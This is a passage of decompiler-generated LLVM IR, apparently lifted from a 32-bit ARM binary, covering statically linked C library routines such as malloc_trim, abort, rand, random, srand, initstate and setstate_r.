  call void @__pseudo_cond_branch(i1 %v1_16fac, i32 ptrtoint (i32* @global_var_16c50.994 to i32))
  %v0_16fb0 = load i32, i32* @r4, align 4
  %v1_16fb0 = add i32 %v0_16fb0, 44
  %v2_16fb0 = inttoptr i32 %v1_16fb0 to i32*
  %v3_16fb0 = load i32, i32* %v2_16fb0, align 4
  store i32 %v3_16fb0, i32* %r3.global-to-local, align 4
  %v1_16fb4 = add i32 %v3_16fb0, 4
  %v2_16fb4 = inttoptr i32 %v1_16fb4 to i32*
  %v3_16fb4 = load i32, i32* %v2_16fb4, align 4
  store i32 %v3_16fb4, i32* %r3.global-to-local, align 4
  %v1_16fb8 = add i32 %v0_16fb0, 836
  %v2_16fb8 = inttoptr i32 %v1_16fb8 to i32*
  %v3_16fb8 = load i32, i32* %v2_16fb8, align 4
  store i32 %v3_16fb8, i32* %r2.global-to-local, align 4
  %v1_16fbc = and i32 %v3_16fb4, -4
  store i32 %v1_16fbc, i32* %r3.global-to-local, align 4
  %v3_16fc0 = icmp ult i32 %v1_16fbc, %v3_16fb8
  br i1 %v3_16fc0, label %dec_label_pc_17000, label %dec_label_pc_16fc8

dec_label_pc_16fc8:                               ; preds = %bb17
  store i32 %v0_16fb0, i32* %r1.global-to-local, align 4
  %v1_16fcc = add i32 %v0_16fb0, 840
  %v2_16fcc = inttoptr i32 %v1_16fcc to i32*
  %v3_16fcc = load i32, i32* %v2_16fcc, align 4
  store i32 %v3_16fcc, i32* %r0.global-to-local, align 4
  %v2_16fd0 = call i32 @__malloc_trim(i32 %v3_16fcc, i32 %v0_16fb0)
  store i32 %v2_16fd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17000

dec_label_pc_16fd8:                               ; preds = %dec_label_pc_16e9c
  %v2_16fd8 = inttoptr i32 %v1_16e6c to i32*
  %v3_16fd8 = load i32, i32* %v2_16fd8, align 4
  store i32 %v3_16fd8, i32* %r0.global-to-local, align 4
  %v1_16fdc = add i32 %v4_16e5c, 848
  %v2_16fdc = inttoptr i32 %v1_16fdc to i32*
  %v3_16fdc = load i32, i32* %v2_16fdc, align 4
  store i32 %v3_16fdc, i32* %r2.global-to-local, align 4
  %v1_16fe0 = add i32 %v4_16e5c, 868
  %v2_16fe0 = inttoptr i32 %v1_16fe0 to i32*
  %v3_16fe0 = load i32, i32* %v2_16fe0, align 4
  %v2_16fe4 = add i32 %v3_16fd8, %v1_16e68
  store i32 %v2_16fe4, i32* %r1.global-to-local, align 4
  %v1_16fe8 = add i32 %v3_16fdc, -1
  store i32 %v1_16fe8, i32* %r2.global-to-local, align 4
  %v2_16fec = sub i32 %v3_16fe0, %v2_16fe4
  store i32 %v2_16fec, i32* %r3.global-to-local, align 4
  store i32 %v2_16fec, i32* %v2_16fe0, align 4
  %v1_16ff4 = load i32, i32* @lr, align 4
  %v2_16ff4 = add i32 %v1_16ff4, 848
  %v3_16ff4 = inttoptr i32 %v2_16ff4 to i32*
  store i32 %v1_16fe8, i32* %v3_16ff4, align 4
  %v0_16ff8 = load i32, i32* %r0.global-to-local, align 4
  %v1_16ff8 = load i32, i32* @r5, align 4
  %v2_16ff8 = sub i32 %v1_16ff8, %v0_16ff8
  store i32 %v2_16ff8, i32* %r0.global-to-local, align 4
  %v4_16ffc = call i32 @munmap(i32 %v2_16ff8, i32 %v2_16fe4, i32 %v1_16fe8, i32 %v2_16fec)
  store i32 %v4_16ffc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17000

dec_label_pc_17000:                               ; preds = %bb17, %dec_label_pc_16f90, %dec_label_pc_16fc8, %dec_label_pc_16e7c, %dec_label_pc_16fd8
  store i32 %v2_16e10, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_1700c = load i32, i32* @r7, align 4
  %v2_1700c = add i32 %v0_1700c, 24
  %v3_1700c = inttoptr i32 %v2_1700c to i32*
  %v4_1700c = load i32, i32* %v3_1700c, align 4
  store i32 %v4_1700c, i32* @ip, align 4
  store i32 94232, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1700c)
  br label %dec_label_pc_17018

dec_label_pc_17018:                               ; preds = %entry, %dec_label_pc_17000
  store i32 %v3_16e04, i32* @r4, align 4
  store i32 %v6_16e04, i32* @r5, align 4
  store i32 %v9_16e04, i32* @r6, align 4
  store i32 %v12_16e04, i32* @r7, align 4
  store i32 %v18_16e04, i32* @lr, align 4
  ret i32 %v2_16e10

; uselistorder directives
  uselistorder i32 %v0_16fb0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_16f70, { 1, 0 }
  uselistorder i32 %v1_16eb0, { 1, 0 }
  uselistorder i32 %v0_16eb0, { 1, 0 }
  uselistorder i32 %v3_16e84, { 1, 0 }
  uselistorder i32 %v1_16e68, { 1, 0, 2 }
  uselistorder i32 %v2_16e64, { 1, 2, 0, 3 }
  uselistorder i32 %v4_16e5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16e0c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_17018, { 1, 0 }
  uselistorder label %dec_label_pc_17000, { 4, 2, 0, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_16f90, { 1, 0 }
  uselistorder label %dec_label_pc_16f50, { 1, 0 }
  uselistorder label %dec_label_pc_16f44, { 1, 0 }
  uselistorder label %dec_label_pc_16f40, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16ef4, { 1, 0 }
}

define i32 @function_17028(i32 %arg1) local_unnamed_addr {
dec_label_pc_17028:
  %v0_17028 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17028, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17028
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17028, %bb
  %v10_1703c = phi i32 [ %arg1, %dec_label_pc_17028 ], [ 0, %bb ]
  ret i32 %v10_1703c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_17040 = load i32, i32* @r4, align 4
  store i32 %v3_17040, i32* %stack_var_-12, align 4
  %v6_17040 = load i32, i32* @r5, align 4
  %v4_17050 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_17050, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_17050, i32* @r0, align 4
  %v0_17060 = call i32 @__malloc_consolidate()
  %v0_17064 = load i32, i32* @r4, align 4
  %v0_17068 = load i32, i32* @r5, align 4
  %v2_17070 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17070, i32* @r4, align 4
  store i32 %v6_17040, i32* @r5, align 4
  %v3_17074 = call i32 @__malloc_trim(i32 %v0_17064, i32 %v0_17068)
  %v0_17078 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17078, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_17068 = inttoptr i32 %v0_17068 to i16*
  %v1_17078 = load i32, i32* @r2, align 4
  %v2_17078 = trunc i32 %v1_17078 to i16
  store i16 %v2_17078, i16* %v1_17068, align 2
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_1707c = phi i32 [ %v3_17074, %entry ], [ 0, %bb ]
  ret i32 %v4_1707c

; uselistorder directives
  uselistorder i32 %v0_17068, { 1, 0 }
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r5, align 4
  %v4_17098 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 16) to i32*), align 4
  store i32 94372, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17098)
  %v2_170b4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_170c0 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_170b4, i32 0, i32 32)
  %v0_170c8 = load i32, i32* @r5, align 4
  %v2_170c8 = add i32 %v0_170c8, 26420
  %v3_170c8 = inttoptr i32 %v2_170c8 to i32*
  %v4_170c8 = load i32, i32* %v3_170c8, align 4
  %v2_170cc = icmp eq i32 %v4_170c8, 0
  br i1 %v2_170cc, label %dec_label_pc_170d4, label %dec_label_pc_17114

dec_label_pc_170d4:                               ; preds = %entry
  store i32 1, i32* %v3_170c8, align 4
  br label %dec_label_pc_170dc

dec_label_pc_170dc:                               ; preds = %dec_label_pc_17124, %dec_label_pc_170d4
  %v0_170e0 = load i32, i32* @r5, align 4
  %v2_170e0 = add i32 %v0_170e0, 1032
  store i32 %v2_170e0, i32* @r4, align 4
  %v2_170ec = add i32 %v0_170e0, 36
  %v3_170ec = inttoptr i32 %v2_170ec to i32*
  %v4_170ec = load i32, i32* %v3_170ec, align 4
  call void @__pseudo_branch(i32 %v4_170ec)
  %v1_170fc = call i32 @__GI_raise(i32 6)
  %v0_17108 = load i32, i32* @r5, align 4
  %v2_17108 = add i32 %v0_17108, 16
  %v3_17108 = inttoptr i32 %v2_17108 to i32*
  %v4_17108 = load i32, i32* %v3_17108, align 4
  store i32 94484, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17108)
  %v0_17118.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17114

dec_label_pc_17114:                               ; preds = %entry, %dec_label_pc_170dc
  %v1_1712c = phi i32 [ %v0_170c8, %entry ], [ %v0_17118.pre, %dec_label_pc_170dc ]
  %v2_17118 = add i32 %v1_1712c, 26420
  %v3_17118 = inttoptr i32 %v2_17118 to i32*
  %v4_17118 = load i32, i32* %v3_17118, align 4
  %v7_1711c = icmp eq i32 %v4_17118, 1
  br i1 %v7_1711c, label %dec_label_pc_17124, label %dec_label_pc_17160

dec_label_pc_17124:                               ; preds = %dec_label_pc_17114
  %v2_17124 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_17124, i32* @r4, align 4
  store i32 2, i32* %v3_17118, align 4
  store i32 20, i32* @r2, align 4
  %v2_1713c = bitcast i32* %stack_var_-28 to i8*
  %v3_1713c = call i32 @__GI_memset(i8* %v2_1713c, i32 0)
  %v3_17158 = call i32 @__libc_sigaction(i32 6, i32 %v2_17124, i32 0)
  br label %dec_label_pc_170dc

dec_label_pc_17160:                               ; preds = %dec_label_pc_17114
  %v7_17160 = icmp eq i32 %v4_17118, 2
  br i1 %v7_17160, label %dec_label_pc_17168, label %dec_label_pc_17174

dec_label_pc_17168:                               ; preds = %dec_label_pc_17160
  store i32 3, i32* %v3_17118, align 4
  %v0_17170 = call i32 @abort()
  %v0_17174.pre = load i32, i32* @r5, align 4
  %v1_17174.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_17174

dec_label_pc_17174:                               ; preds = %dec_label_pc_17160, %dec_label_pc_17168
  %v3_17180 = phi i32 [ 26420, %dec_label_pc_17160 ], [ %v1_17174.pre, %dec_label_pc_17168 ]
  %v2_17180 = phi i32 [ %v1_1712c, %dec_label_pc_17160 ], [ %v0_17174.pre, %dec_label_pc_17168 ]
  %v2_17174 = add i32 %v2_17180, %v3_17180
  %v3_17174 = inttoptr i32 %v2_17174 to i32*
  %v4_17174 = load i32, i32* %v3_17174, align 4
  %v7_17178 = icmp eq i32 %v4_17174, 3
  br i1 %v7_17178, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17174
  store i32 4, i32* %v3_17174, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17174, %bb
  call void @__pseudo_cond_branch(i1 %v7_17178, i32 ptrtoint (i32* @global_var_13180.1003 to i32))
  br label %dec_label_pc_1718c

dec_label_pc_1718c:                               ; preds = %dec_label_pc_1718c, %.thread2
  %v0_1718c = call i32 @abort()
  br label %dec_label_pc_1718c

; uselistorder directives
  uselistorder i32* %v3_17118, { 1, 0, 2 }
  uselistorder i32 ()* @abort, { 2, 1, 5, 4, 6, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_sigprocmask, { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_17174, { 1, 0 }
  uselistorder label %dec_label_pc_17114, { 1, 0 }
}

define i32 @function_17198(i32 %arg1) local_unnamed_addr {
dec_label_pc_17198:
  %v0_17198 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17198, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17198
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17198, %bb
  %v4_171a4 = phi i32 [ %arg1, %dec_label_pc_17198 ], [ 0, %bb ]
  ret i32 %v4_171a4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_171b0 = call i32 @random()
  ret i32 %v0_171b0
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_171c0 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r4, align 4
  %v4_171f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_171f0)
  %v0_17204 = load i32, i32* @r4, align 4
  %v2_17204 = add i32 %v0_17204, 16
  %v3_17204 = inttoptr i32 %v2_17204 to i32*
  %v4_17204 = load i32, i32* %v3_17204, align 4
  store i32 ptrtoint (i32* @global_var_17210.1008 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17204)
  %v2_17214 = ptrtoint i32* %stack_var_-20 to i32
  %v0_17218 = load i32, i32* @r4, align 4
  %v2_17218 = add i32 %v0_17218, 1208
  %v2_1721c = inttoptr i32 %v2_17218 to i32*
  %v3_1721c = call i32 @__GI_random_r(i32* %v2_1721c, i32 %v2_17214)
  %v0_1722c = load i32, i32* @r4, align 4
  %v2_1722c = add i32 %v0_1722c, 24
  %v3_1722c = inttoptr i32 %v2_1722c to i32*
  %v4_1722c = load i32, i32* %v3_1722c, align 4
  call void @__pseudo_branch(i32 %v4_1722c)
  %v3_17238 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_171c0, i32* @r4, align 4
  ret i32 %v3_17238
}

define i32 @function_1724c(i16* %arg1) local_unnamed_addr {
dec_label_pc_1724c:
  %v0_1724c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1724c, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_1724c
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_1724c
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_17294 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17294)
  %v0_172a8 = load i32, i32* @r6, align 4
  %v2_172a8 = add i32 %v0_172a8, 16
  %v3_172a8 = inttoptr i32 %v2_172a8 to i32*
  %v4_172a8 = load i32, i32* %v3_172a8, align 4
  call void @__pseudo_branch(i32 %v4_172a8)
  %v0_172b8 = load i32, i32* @r6, align 4
  %v2_172b8 = add i32 %v0_172b8, 1208
  %v0_172c0 = load i32, i32* @r5, align 4
  %v1_172c4 = add i32 %v0_172b8, 1216
  %v2_172c4 = inttoptr i32 %v1_172c4 to i32*
  %v3_172c4 = load i32, i32* %v2_172c4, align 4
  store i32 %v3_172c4, i32* @r4, align 4
  %v2_172c8 = inttoptr i32 %v2_172b8 to i32*
  %v3_172c8 = call i32 @setstate_r(i32 %v0_172c0, i32* %v2_172c8)
  %v1_172d0 = icmp slt i32 %v3_172c8, 0
  %v3_172e0 = load i32, i32* @r4, align 4
  %v4_172e0 = add i32 %v3_172e0, -4
  %storemerge = select i1 %v1_172d0, i32 0, i32 %v4_172e0
  %v0_172e4 = load i32, i32* @r6, align 4
  %v2_172e4 = add i32 %v0_172e4, 24
  %v3_172e4 = inttoptr i32 %v2_172e4 to i32*
  %v4_172e4 = load i32, i32* %v3_172e4, align 4
  call void @__pseudo_branch(i32 %v4_172e4)
  ret i32 %storemerge
}

define i32 @function_17304(i16* %arg1) local_unnamed_addr {
dec_label_pc_17304:
  %v0_17304 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17304, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_17304
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_17304
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_17354 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17354)
  %v0_17368 = load i32, i32* @r4, align 4
  %v2_17368 = add i32 %v0_17368, 16
  %v3_17368 = inttoptr i32 %v2_17368 to i32*
  %v4_17368 = load i32, i32* %v3_17368, align 4
  call void @__pseudo_branch(i32 %v4_17368)
  %v0_17378 = load i32, i32* @r6, align 4
  %v0_1737c = load i32, i32* @r4, align 4
  %v2_1737c = add i32 %v0_1737c, 1208
  %v0_17380 = load i32, i32* @r7, align 4
  %v0_17384 = load i32, i32* @sl, align 4
  store i32 %v0_17384, i32* @r0, align 4
  %v1_17388 = add i32 %v0_1737c, 1216
  %v2_17388 = inttoptr i32 %v1_17388 to i32*
  %v3_17388 = load i32, i32* %v2_17388, align 4
  store i32 %v3_17388, i32* @r5, align 4
  %v4_1738c = inttoptr i32 %v0_17384 to i32*
  %v5_1738c = call i32 @__GI_initstate_r(i32* %v4_1738c, i32 %v0_17378, i32 %v0_17380, i32 %v2_1737c)
  %v0_1739c = load i32, i32* @r4, align 4
  %v2_1739c = add i32 %v0_1739c, 24
  %v3_1739c = inttoptr i32 %v2_1739c to i32*
  %v4_1739c = load i32, i32* %v3_1739c, align 4
  call void @__pseudo_branch(i32 %v4_1739c)
  %v0_173a8 = load i32, i32* @r5, align 4
  %v1_173a8 = add i32 %v0_173a8, -4
  ret i32 %v1_173a8
}

define i32 @function_173c4(i16* %arg1) local_unnamed_addr {
dec_label_pc_173c4:
  %v0_173c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_173c4, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_173c4
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_173c4
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_173dc = load i32, i32* @r4, align 4
  %v6_173dc = load i32, i32* @r5, align 4
  %v9_173dc = load i32, i32* @r6, align 4
  %v15_173dc = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r4, align 4
  %v2_173f0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 1056), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_1740c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1740c)
  %v0_17420 = load i32, i32* @r4, align 4
  %v2_17420 = add i32 %v0_17420, 16
  %v3_17420 = inttoptr i32 %v2_17420 to i32*
  %v4_17420 = load i32, i32* %v3_17420, align 4
  call void @__pseudo_branch(i32 %v4_17420)
  %v0_17430 = load i32, i32* @r6, align 4
  store i32 %v0_17430, i32* @r0, align 4
  %v0_17434 = load i32, i32* @r4, align 4
  %v2_17434 = add i32 %v0_17434, 1208
  %v2_17438 = inttoptr i32 %v0_17430 to i32*
  %v3_17438 = call i32 @srandom_r(i32* %v2_17438, i32 %v2_17434)
  %v0_1744c = load i32, i32* @r4, align 4
  %v2_1744c = add i32 %v0_1744c, 24
  %v3_1744c = inttoptr i32 %v2_1744c to i32*
  %v4_1744c = load i32, i32* %v3_1744c, align 4
  call void @__pseudo_branch(i32 %v4_1744c)
  store i32 %v3_173dc, i32* @r4, align 4
  store i32 %v6_173dc, i32* @r5, align 4
  store i32 %v9_173dc, i32* @r6, align 4
  store i32 %v15_173dc, i32* @lr, align 4
  ret i32 %v2_173f0
}

define i32 @function_17468(i16* %arg1) local_unnamed_addr {
dec_label_pc_17468:
  %v0_17468 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17468, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_17468
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_17468
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_17480 = load i32, i32* @r4, align 4
  store i32 %v3_17480, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_17488 = add i32 %tmp, 12
  %v2_17488 = inttoptr i32 %v1_17488 to i8*
  %v3_17488 = load i8, i8* %v2_17488, align 1
  %v4_17488 = zext i8 %v3_17488 to i32
  store i32 %v4_17488, i32* %r1.global-to-local, align 4
  %v2_1748c = icmp eq i8 %v3_17488, 0
  store i1 %v2_1748c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1748c, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_1749412 = add i32 %arg1, 4
  store i32 %v1_1749412, i32* %r6.global-to-local, align 4
  %v1_1749813 = add i32 %tmp, 8
  %v2_1749814 = inttoptr i32 %v1_1749813 to i32*
  %v3_1749815 = load i32, i32* %v2_1749814, align 4
  store i32 %v3_1749815, i32* %r0.global-to-local, align 4
  %v3_174b4 = add i32 %v3_1749815, -4
  %v4_174b4 = inttoptr i32 %v3_174b4 to i32*
  store i32 %v4_17488, i32* %v4_174b4, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_17490 = add i32 %tmp, 4
  %v3_17490 = inttoptr i32 %v2_17490 to i32*
  %v4_17490 = load i32, i32* %v3_17490, align 4
  %v1_17494 = add i32 %arg1, 4
  store i32 %v1_17494, i32* %r6.global-to-local, align 4
  %v1_17498 = add i32 %tmp, 8
  %v2_17498 = inttoptr i32 %v1_17498 to i32*
  %v3_17498 = load i32, i32* %v2_17498, align 4
  store i32 %v3_17498, i32* %r0.global-to-local, align 4
  %v3_174a0 = sub i32 %v4_17490, %v3_17498
  %v4_174a4 = sdiv i32 %v3_174a0, 4
  %v4_174a8 = sext i8 %v3_17488 to i32
  store i32 %v4_174a8, i32* %r1.global-to-local, align 4
  %v4_174b0 = mul i32 %v4_174a4, 5
  %v5_174b0 = add i32 %v4_174b0, %v4_174a8
  %v3_174b8 = add i32 %v3_17498, -4
  %v4_174b8 = inttoptr i32 %v3_174b8 to i32*
  store i32 %v5_174b0, i32* %v4_174b8, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_174c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_174c0 = add i32 %v0_174c0, -4
  %v2_174c0 = inttoptr i32 %v1_174c0 to i32*
  %v3_174c0 = load i32, i32* %v2_174c0, align 4
  %v2_174c8 = udiv i32 %v3_174c0, 5
  %v3_174c8 = urem i32 %v3_174c0, 5
  store i32 %v2_174c8, i32* %r0.global-to-local, align 4
  store i32 %v3_174c8, i32* %r1.global-to-local, align 4
  %v2_174d0 = icmp ugt i32 %v3_174c8, 3
  %v7_174d0 = icmp eq i32 %v3_174c8, 4
  store i1 %v7_174d0, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r5.global-to-local, align 4
  %v2_174d8 = xor i1 %v7_174d0, true
  %v3_174d8 = and i1 %v2_174d0, %v2_174d8
  br i1 %v3_174d8, label %dec_label_pc_17540, label %dec_label_pc_174dc

dec_label_pc_174dc:                               ; preds = %bb
  %v4_174e4 = mul nuw nsw i32 %v3_174c8, 4
  %v5_174e4 = add i32 %v4_174e4, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35392)
  %v1_174e8 = add i32 %v4_174e4, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35372)
  %v2_174e8 = inttoptr i32 %v1_174e8 to i32*
  %v3_174e8 = load i32, i32* %v2_174e8, align 4
  store i32 %v3_174e8, i32* %r5.global-to-local, align 4
  %v6_174ec = inttoptr i32 %v5_174e4 to i32*
  %v7_174ec = load i32, i32* %v6_174ec, align 4
  store i32 %v7_174ec, i32* %r7.global-to-local, align 4
  %v2_174f0 = icmp eq i32 %v3_174c8, 0
  store i1 %v2_174f0, i1* %cpsr_z.global-to-local, align 1
  %v1_174f4 = trunc i32 %v3_174e8 to i8
  %v2_174f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_174f4 = add i32 %v2_174f4, 13
  %v4_174f4 = inttoptr i32 %v3_174f4 to i8*
  store i8 %v1_174f4, i8* %v4_174f4, align 1
  %v0_174f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_174f8 = trunc i32 %v0_174f8 to i8
  %v2_174f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_174f8 = add i32 %v2_174f8, 14
  %v4_174f8 = inttoptr i32 %v3_174f8 to i8*
  store i8 %v1_174f8, i8* %v4_174f8, align 1
  %v0_174fc = load i32, i32* %r1.global-to-local, align 4
  %v1_174fc = trunc i32 %v0_174fc to i8
  %v2_174fc = load i32, i32* %r4.global-to-local, align 4
  %v3_174fc = add i32 %v2_174fc, 12
  %v4_174fc = inttoptr i32 %v3_174fc to i8*
  store i8 %v1_174fc, i8* %v4_174fc, align 1
  %v0_17500 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17500, label %dec_label_pc_1752c, label %dec_label_pc_17504

dec_label_pc_17504:                               ; preds = %dec_label_pc_174dc
  store i32 5, i32* %r1.global-to-local, align 4
  %v0_17508 = load i32, i32* %r6.global-to-local, align 4
  %v1_17508 = add i32 %v0_17508, -4
  %v2_17508 = inttoptr i32 %v1_17508 to i32*
  %v3_17508 = load i32, i32* %v2_17508, align 4
  %v2_1750c = sdiv i32 %v3_17508, 5
  store i32 %v2_1750c, i32* %r0.global-to-local, align 4
  %v4_17510 = mul i32 %v2_1750c, 4
  %v5_17510 = add i32 %v4_17510, %v0_17508
  %v1_17514 = load i32, i32* %r4.global-to-local, align 4
  %v2_17514 = add i32 %v1_17514, 4
  %v3_17514 = inttoptr i32 %v2_17514 to i32*
  store i32 %v5_17510, i32* %v3_17514, align 4
  %v0_17518 = load i32, i32* %r7.global-to-local, align 4
  %v1_17518 = load i32, i32* %r0.global-to-local, align 4
  %v2_17518 = add i32 %v1_17518, %v0_17518
  %v0_1751c = load i32, i32* %r5.global-to-local, align 4
  %v2_17520 = udiv i32 %v2_17518, %v0_1751c
  %v3_17520 = urem i32 %v2_17518, %v0_1751c
  store i32 %v2_17520, i32* %r0.global-to-local, align 4
  %v0_17524 = load i32, i32* %r6.global-to-local, align 4
  %v4_17524 = mul i32 %v3_17520, 4
  %v5_17524 = add i32 %v0_17524, %v4_17524
  store i32 %v5_17524, i32* %r1.global-to-local, align 4
  %v1_17528 = load i32, i32* %r4.global-to-local, align 4
  %v2_17528 = inttoptr i32 %v1_17528 to i32*
  store i32 %v5_17524, i32* %v2_17528, align 4
  br label %dec_label_pc_1752c

